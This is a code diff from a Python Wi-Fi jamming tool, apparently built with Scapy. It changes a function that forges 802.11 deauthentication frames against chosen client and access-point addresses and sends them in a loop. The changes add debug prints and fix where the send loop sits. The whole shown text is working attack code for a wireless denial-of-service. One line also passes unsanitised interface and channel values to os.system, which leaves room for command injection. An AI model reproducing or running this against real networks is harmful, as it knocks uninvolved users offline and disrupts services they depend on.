@@ -116,6 +116,7 @@ def set_channel(ch, iface):
     os.system(f"iwconfig {iface} channel {ch}")
 
 def channel_sweep(iface, chan_list=None):
+    print(chan_list)
     t = currentThread()
     t.stop = True
     if chan_list is None:
@@ -145,13 +146,14 @@ def choose_from_networks(networks:list) -> list:
 def jam_network(target_list:list, iface, loop:int):
     packets = []
     for target in target_list:
+        print(target.addr)
         deauth_packet = RadioTap()/Dot11(addr1=target.addr, addr2=target.ap, addr3=target.ap)/Dot11Deauth()
         packets.append(deauth_packet)
-        for i in range(loop):
-            for packet in packets:
-                try:
-                    sendp(packet, iface=iface)
-                    time.sleep(1)
-                except KeyboardInterrupt:
-                    return 1
+    for i in range(loop):
+        for packet in packets:
+            try:
+                sendp(packet, iface=iface)
+                time.sleep(1)
+            except KeyboardInterrupt:
+                return 1
     return 0
